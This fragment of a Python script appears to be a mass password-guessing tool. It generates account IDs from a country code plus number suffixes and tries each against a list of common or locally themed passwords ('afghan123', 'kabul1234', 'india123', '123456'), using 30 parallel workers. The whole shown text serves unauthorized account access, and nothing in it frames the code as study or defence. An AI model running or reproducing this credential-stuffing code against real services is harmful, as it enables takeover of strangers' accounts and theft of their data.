...
def afg():
                ...
                with tred(max_workers=30) as ROJOB:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','123456','1234567','12345678','123456789','1234567890','012345678','112233','11223344','freefire','freefirelover','pubglover','i love pubg','gamingboy','jadid1234','moksidul123','rohan123','nayem123','khan123456','khan786']
                                ROJOB.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def ind():
                ...
                with tred(max_workers=30) as ROJOB:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','123456','1234567','12345678','123456789','1234567890','012345678','112233','11223344','freefire','freefirelover','pubglover','i love pubg','gamingboy','jadid1234','moksidul123','rohan123','nayem123','kingkhan','india123','59039200','57575751']
                                ROJOB.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
